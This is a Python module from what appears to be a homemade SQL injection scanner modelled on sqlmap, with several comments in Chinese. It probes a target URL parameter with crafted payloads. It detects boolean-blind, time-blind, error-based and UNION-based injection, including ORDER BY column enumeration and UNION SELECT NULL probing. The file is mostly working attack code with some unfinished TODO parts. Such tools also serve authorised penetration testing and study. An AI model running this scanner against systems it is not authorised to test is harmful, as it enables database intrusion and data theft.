import difflib
import time
import math
import re

from lib.parsers import payloadParser
from lib.common import xmlLoader
from urllib.parse import urlencode
from lib.data.settings import *
from lib.data.data import target
from lib.data.data import options
from lib.data.data import rn
from lib.common import connect
from lib.common import logger
from lib.common.exception import *
from lib.common.common import *



def queryTarget(payloadTemplate=None, replacements={}):

    if payloadTemplate:
        payload = payloadParser.renderValue(payloadTemplate, target.paramName, target.origValue, target.origValue_negative, replacements=replacements)
        payload = payloadParser.renderSQL(orig=payload, replacements=replacements)
        get = urlencode({target.paramName: payload})
        url = target.url_without_testParam
        rn.lastQueryPayload = payload
    else:
        get = None
        url = target.originalUrl

    start = time.time()

    try:
        page, headers, code = connect.getPage(url=url, get=get, method=target.method)
    except ConnectionException as ex:
        logger.error('query target: ' + ex.msg)
        raise
    except DecodeError as ex:
        logger.error('query target: ' + ex.msg)
        raise

    queryDuration = time.time() - start
    return page, headers, code, queryDuration


def checkConnection():

    infoMsg = "testing connection to the target URL"
    logger.info(infoMsg)

    try:
        page, headers, code, _ = queryTarget()

        if not page:
            errMsg = "unable to retrieve page content"
            raise ConnectionException(errMsg)

        rn.originalPage = rn.pageTemplate = page
        rn.originalCode = code

        infoMsg = "check connection: code {}".format(code)
        logger.info(infoMsg)

    except Exception:
        errMsg = 'check connection: failed'
        logger.error(errMsg)
        raise QuitException

def checkStability():

    infoMsg = "testing if the target URL content is stable"
    logger.info(infoMsg)

    firstPage = rn.originalPage

    try:
        secondPage, _, _, _, = queryTarget()
        rn.pageStable = (firstPage == secondPage)
    except Exception:
        errMsg = 'check stability: failed to query target'
        logger.error(errMsg)
        raise QuitException

    if rn.pageStable:
        if firstPage:
            infoMsg = "target URL content is stable"
            logger.info(infoMsg)
        else:
            errMsg = "there was an error checking the stability of page "
            errMsg += "because of lack of content. Please check the "
            errMsg += "page request results (and probable errors) by "
            errMsg += "using higher verbosity levels"
            logger.error(errMsg)
    else:
        checkDynamicContent(firstPage, secondPage)

def checkDynamicContent(firstPage, secondPage):
    #TODO
    infoMsg = 'check dynamic content'
    logger.info(infoMsg)

    if any(page is None for page in (firstPage, secondPage)):
        warnMsg = "can't check dynamic content "
        warnMsg += "because of lack of page content"
        logger.critical(warnMsg)
        return

    seqMatcher = difflib.SequenceMatcher(None)
    seqMatcher.set_seq1(firstPage)
    seqMatcher.set_seq2(secondPage)
    ratio = seqMatcher.quick_ratio()

    if ratio <= UPPER_RATIO_BOUND:
        findDynamicContent(firstPage, secondPage)

#TODO
def findDynamicContent(firstPage, secondPage):

    if not firstPage or not secondPage:
        return

    infoMsg = "searching for dynamic content"
    logger.info(infoMsg)


def comparison(page1, page2):
    # TODO:customize
    #page1 page2 能否被认为是得到了相同的SQL查询结果
    ratio = getComparisonRatio(page1, page2)
    if ratio > UPPER_RATIO_BOUND:
        return True


def pageSucceed(page):
    #TODO:customize
    #page表明SQL查询正常,条件为真而返回结果
    #此处只处理了正常执行，参数被认为与originalValue相同的情况
    #需要添加：正常执行，参数被认为与originalValue不同(且结果不为空)的情况
    orignPage = rn.originalPage

    if comparison(orignPage, page):
        return True

    return False


def pageFalse(page):
    # TODO:customize
    # page表明SQL查询正常,条件为假而未返回结果
    falsePage, _, _, _ = queryTarget(target.origValue_negative)  # 设定条件为假的页面

    if comparison(falsePage, page):
        return True

def pageError(page):
    # TODO:customize
    # page表明SQL查询发生了异常
    errors = xmlLoader.loadErrorsXml(FILE_XML_ERRORS)

    for dbms in errors:
        for error in dbms:
            if re.search(error, page or "", re.I) and not re.search(error, rn.originalPage or "", re.I):
                return True

    return False


def pageRegexp(regexp, page):
    # TODO:customize
    #可加入对page的处理: 去掉动态内容等

    match = re.search(regexp, page, re.DOTALL | re.IGNORECASE)

    return match

def wasResponseDelayed(responseTime):

    if responseTime:
        retVal = (responseTime >= max(MIN_VALID_DELAYED_RESPONSE, rn.lowerStdLimit))
        return retVal



def getComparisonRatio(page1, page2):

    if page1 is None or page2 is None:
        return None

    seqMatcher = difflib.SequenceMatcher(None)

    seqMatcher.set_seq1(page1)
    seqMatcher.set_seq2(page2)

    ratio = round(seqMatcher.ratio(), 3)

    return ratio


def createPayloadTemplates(payloads):

    boundaries = xmlLoader.loadXml(FILE_XML_BOUNDARIES)

    for p in payloads:
        for boundary in boundaries:

            payload = dict(p)

            clauseMatch = True
            if payload['clause'] != 0 and boundary['clause'] != 0:
                clauseMatch = False
                for _ in payload['clause'].split(','):
                    if _ in boundary['clause'].split(','):
                        clauseMatch = True

            if not clauseMatch: continue

            whereMatch = True
            if boundary['where'] != 0:
                whereMatch = False
                if payload['where'] in boundary['where'].split(','):
                    whereMatch = True

            if not whereMatch: continue

            payload['where'] = int(payload['where'])

            if 'payload' in payload:
                if payload['where'] == PAYLOAD_WHERE_ORIGINAL:
                    payloadTemplate = '[_ORIGINAL]' + boundary['prefix'] + payload['payload'] + boundary[
                        'suffix']
                if payload['where'] == PAYLOAD_WHERE_NEGATIVE:
                    payloadTemplate = '[_ORIGINAL_NEGATIVE]' + boundary['prefix'] + payload['payload'] + \
                                      boundary['suffix']
                if payload['where'] == PAYLOAD_WHERE_REPLACE:
                    pass
                payload['payload'] = payloadTemplate

            if 'comparison' in payload:
                if payload['where'] == PAYLOAD_WHERE_ORIGINAL:
                    payload['comparison'] = '[_ORIGINAL]' + boundary['prefix'] + payload['comparison'] + boundary[
                        'suffix']
                if payload['where'] == PAYLOAD_WHERE_NEGATIVE:
                    payload['comparison'] = '[_ORIGINAL_NEGATIVE]' + boundary['prefix'] + payload['comparison'] + \
                                            boundary['suffix']
                if payload['where'] == PAYLOAD_WHERE_REPLACE:
                    pass


            yield payload


def createTests():
    test = {}

    if options.cmdArgs.technique == 'B':
        payloads = FILE_XML_BOOLEAN_BLIND
    if options.cmdArgs.technique == 'T':
        payloads = FILE_XML_TIME_BLIND
    if options.cmdArgs.technique == 'E':
        payloads = FILE_XML_ERROR_BASED
    payloads = xmlLoader.loadXml(payloads)

    payloads = createPayloadTemplates(payloads)

    for payload in payloads:
        test['payloadTemplate'] = payload['payload']
        test['title'] = payload['title']
        if options.cmdArgs.technique == TECHNIQUE_BOOLEAN_BLIND:
            test['comparisonTemplate'] = payload['comparison']
            test['where'] = int(payload['where'])
        if options.cmdArgs.technique == TECHNIQUE_ERROR_BASED:
            test['grep'] = payload['grep']

        yield test

def check_boolean_blind():

    infoMsg = 'testing for BOOLEAN BLIND injection on {} parameter {}'.format(target.method, target.paramName)
    logger.info(infoMsg)

    injectable = False

    #Create tests
    tests = createTests()

    # Query Target
    for test in tests:

        if injectable:
            break

        infoMsg = 'test \'{}\''.format(test['title'])
        logger.info(infoMsg)

        page1, _, _, _ = queryTarget(test['payloadTemplate'])
        payload = rn.lastQueryPayload
        page2, _, _, _ = queryTarget(test['comparisonTemplate'])
        payloadComparison = rn.lastQueryPayload

        if pageSucceed(page1) and pageFalse(page2) or pageSucceed(page2) and pageSucceed(page1):
            injectable = True

    if injectable:
        msg = '{} parameter \'{}\' is injectable'.format(target.method, target.paramName)
        logger.puts(msg)
        msg = '---\n'
        msg += 'Parameter: {} ({})\n'.format(target.paramName, target.method)
        msg += '\tType: BOOLEAN BLIND\n'
        msg += '\tTitle: {}\n'.format(test['title'])
        msg += '\tPayload: {}\n'.format(payload)
        msg += '\tComparisonPayload: {}\n'.format(payloadComparison)
        msg += '---'
        logger.puts(msg)
    else:
        msg = '{} parameter \'{}\' does not seem to be injectable by BOOLEAN BLIND.'.format(target.method, target.paramName)
        logger.puts(msg)

def check_union_based():

    infoMsg = 'testing for UNION query injection on {} parameter {}'.format(target.method, target.paramName)
    logger.info(infoMsg)

    injectable = False
    boundaries = xmlLoader.loadXml(FILE_XML_BOUNDARIES)

    for boundary in boundaries:
        if injectable:
            break

        lowCols = 1
        highCols = 20

        def orderBySucceed(cols):
            # TODO:customize
            payloadTemplate = '[_ORIGINAL]' + boundary['prefix'] + 'ORDER BY ' + str(cols) + boundary['suffix']
            page, _, _, _ = queryTarget(payloadTemplate=payloadTemplate)

            if re.search(r"data types cannot be compared or sorted", page or "", re.I) is not None:
                return True

            if pageSucceed(page) and comparison(rn.originalPage, page):
                return True

            return False

        def orderByFailed(cols):
            # TODO:customize
            payloadTemplate = '[_ORIGINAL]' + boundary['prefix'] + 'ORDER BY ' + str(cols) + boundary['suffix']
            page, _, _, _ = queryTarget(payloadTemplate=payloadTemplate)

            for _ in ("(warning|error):", "order (by|clause)", "unknown column", "failed"):
                if re.search(_, page or "", re.I) and not re.search(_, rn.originalPage or "", re.I):
                    return True

            if pageError(page):
                return True

            return False

        def orderByTest(lowCols, highCols):

            infoMsg = 'testing ORDER BY - prefix: {} suffix: {}'.format(boundary['prefix'], boundary['suffix'])
            logger.info(infoMsg)

            column = 0

            if orderBySucceed(lowCols) and not orderBySucceed(highCols) or orderByFailed(highCols) and not orderByFailed(lowCols):
                mid = 0
                while lowCols <= highCols:
                    mid = int((highCols+lowCols)/2)
                    if mid == lowCols:
                        break
                    if orderBySucceed(lowCols) and not orderBySucceed(mid) or orderByFailed(mid) and not orderByFailed(lowCols):
                        highCols = mid
                    elif orderBySucceed(mid) and not orderBySucceed(highCols) or orderByFailed(highCols) and not orderByFailed(mid):
                        lowCols = mid
                    else:
                        return None
                column = mid

            return column


        def unionSelectTest(highCols):
            # TODO:customize
            infoMsg = 'testing UNION SELECT - prefix: {} suffix: {}'.format(boundary['prefix'], boundary['suffix'])
            logger.info(infoMsg)

            column = 0
            maxRatio = 0

            for i in range(1,highCols+1):
                select = 'UNION SELECT NULL' + (i-1)*',NULL'
                payloadTemplate = '[_ORIGINAL]' + boundary['prefix'] + select + boundary['suffix']
                page, _, _, _ = queryTarget(payloadTemplate=payloadTemplate)


                if pageSucceed(page):

                    if comparison(rn.originalPage, page):
                        column = i
                        return column

                    ratio = getComparisonRatio(page, rn.originalPage)
                    if ratio > maxRatio:
                        maxRatio = ratio
                        column = i

            return column



        column = orderByTest(lowCols, highCols)

        if column == 0:
            column = unionSelectTest(highCols)
        if column == 0:
            continue

        logger.puts("found column: {}".format(column))

        #test whether injectale
        randStr = randomStr(10)

        for i in range(1,column+1):

            if i == 1:
                select = 'UNION SELECT ' + randStr + (column-1)*',NULL'
            else:
                select = 'UNION SELECT NULL,' + (i-2)*'NULL,' + randStr + (column-i)*',NULL'

            payloadTemplate = '[_ORIGINAL_NEGATIVE]' + boundary['prefix'] + select + boundary['suffix']
            page, _, _, _ = queryTarget(payloadTemplate=payloadTemplate)
            match = pageRegexp(randStr, page)

            if match:
                injectable = True
                break


    if injectable:
        msg = '{} parameter \'{}\' is injectable'.format(target.method, target.paramName)
        logger.puts(msg)
        msg = '---\n'
        msg += 'Parameter: {} ({})\n'.format(target.paramName, target.method)
        msg += '\tType: UNION query\n'
        msg += '\tPayload: {}\n'.format(rn.lastQueryPayload)
        msg += '---'
        logger.puts(msg)
    else:
        msg = '{} parameter \'{}\' does not seem to be injectable by UNION query.'.format(target.method, target.paramName)
        logger.puts(msg)


def check_time_blind():

    infoMsg = 'testing for TIME BLIND injection on {} parameter {}'.format(target.method, target.paramName)
    logger.info(infoMsg)

    injectable = False

    # Create tests
    tests = createTests()

    #Get lowerStdLimit
    responseTimes = []

    for _ in range(MIN_TIME_RESPONSES):
        _,_,_,queryDuration = queryTarget()
        responseTimes.append(queryDuration)

    avg = (1.0 * sum(responseTimes) / len(responseTimes))
    _ = 1.0 * sum(pow((_ or 0) - avg, 2) for _ in responseTimes)
    deviation = math.sqrt(_ / (len(responseTimes) - 1))
    rn.lowerStdLimit = avg + TIME_STDEV_COEFF * deviation  # 最慢的响应时间


    # Query Target
    for test in tests:

        if injectable:
            break
        infoMsg = 'test \'{}\''.format(test['title'])
        logger.info(infoMsg)

        _,_,_,responseTime = queryTarget(payloadTemplate=test['payloadTemplate'], replacements={'[ACTION]':SLEEP_TIME})
        trueResult = wasResponseDelayed(responseTime)
        if trueResult:
            _,_,_,responseTime = queryTarget(payloadTemplate=test['payloadTemplate'], replacements={'[ACTION]':'0'})
            falseResult = wasResponseDelayed(responseTime)
            if falseResult:
                continue

        _, _, _, responseTime = queryTarget(payloadTemplate=test['payloadTemplate'],replacements={'[ACTION]': SLEEP_TIME})
        trueResult = wasResponseDelayed(responseTime)

        if trueResult:

            injectable = True
            break

    if injectable:
        msg = '{} parameter \'{}\' is injectable'.format(target.method, target.paramName)
        logger.puts(msg)
        msg = '---\n'
        msg += 'Parameter: {} ({})\n'.format(target.paramName, target.method)
        msg += '\tType: TIME BLIND\n'
        msg += '\tTitle: {}\n'.format(test['title'])
        msg += '\tPayload: {}\n'.format(rn.lastQueryPayload)
        msg += '---'
        logger.puts(msg)
    else:
        msg = '{} parameter \'{}\' does not seem to be injectable by TIME BLIND.'.format(target.method, target.paramName)
        logger.puts(msg)



def check_error_based():

    infoMsg = 'testing for ERROR BASED injection on {} parameter {}'.format(target.method, target.paramName)
    logger.info(infoMsg)

    injectable = False
    output = None

    # Create tests
    tests = createTests()

    # Query Target
    for test in tests:

        if injectable:
            break
        infoMsg = 'test \'{}\''.format(test['title'])
        logger.info(infoMsg)

        try:
            startStr = randomStr(3)
            stopStr = randomStr(3)
            markInt = str(randomInt())
            markStr = randomStr(3)

            page,_,_,_ = queryTarget(payloadTemplate=test['payloadTemplate'],
                                     replacements={'[DELIMITER_START]': startStr, '[DELIMITER_STOP]': stopStr, '[MARKINT]': markInt, '[MARKSTR]': markStr})

            regex = test['grep']
            regex = regex.replace('[DELIMITER_START]', startStr)
            regex = regex.replace('[DELIMITER_STOP]', stopStr)
            match = pageRegexp(regex, page)

            if match:
                output = match.group("result")

            if output:
                result = output == markInt or output == markStr

                if result:
                    injectable = True
                    msg = '{} parameter \'{}\' is injectable'.format(target.method, target.paramName)
                    logger.puts(msg)
                    msg = '---\n'
                    msg += 'Parameter: {} ({})\n'.format(target.paramName, target.method)
                    msg += '\tType: ERROR BASED\n'
                    msg += '\tTitle: {}\n'.format(test['title'])
                    msg += '\tPayload: {}\n'.format(rn.lastQueryPayload)
                    msg += '---'
                    logger.puts(msg)

        except Exception:
            raise QuitException

    if not injectable:
        msg = '{} parameter \'{}\' does not seem to be injectable by ERROR BASED.'.format(target.method, target.paramName)
        logger.puts(msg)




def check():

    try:
        checkConnection()
        checkStability()

        msg = 'start testing for SQL injection'
        logger.puts(msg)

        if options.cmdArgs.technique == TECHNIQUE_BOOLEAN_BLIND:
            check_boolean_blind()
        if options.cmdArgs.technique == TECHNIQUE_TIME_BLIND:
            check_time_blind()
        if options.cmdArgs.technique == TECHNIQUE_ERROR_BASED:
            check_error_based()
        if options.cmdArgs.technique == TECHNIQUE_UNION_BASED:
            check_union_based()
    except QuitException:
        raise




